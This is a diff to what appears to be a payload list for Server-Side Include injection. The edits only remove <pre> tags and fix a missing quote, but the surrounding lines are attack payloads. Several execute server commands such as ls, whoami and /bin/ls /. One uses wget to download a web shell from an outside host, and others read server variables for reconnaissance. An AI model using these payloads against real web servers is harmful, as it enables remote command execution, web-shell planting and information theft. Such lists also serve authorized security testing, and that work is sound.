@@ -1,7 +1,7 @@
-<pre><!--#exec cmd="ls" --></pre>
-<pre><!--#echo var="DATE_LOCAL" --> </pre>
-<pre><!--#exec cmd="whoami"--></pre>
-<pre><!--#exec cmd="dir" --></pre>
+<!--#exec cmd="ls" -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#exec cmd="whoami"-->
+<!--#exec cmd="dir" -->
 <!--#exec cmd="ls" -->
 <!--#exec cmd="wget http://website.com/dir/shell.txt" -->
 <!--#exec cmd="/bin/ls /" -->
@@ -44,7 +44,7 @@
 <!--#echo var="server_software" -->
 <!--#echo var="server_protocol" -->
 <!--#echo var="server_port" -->
-<!--#echo var="server_name -->
+<!--#echo var="server_name" -->
 <!--#echo var="server_addr" -->
 <!--#echo var="server_admin" -->
 <!--#echo var="script_url" -->
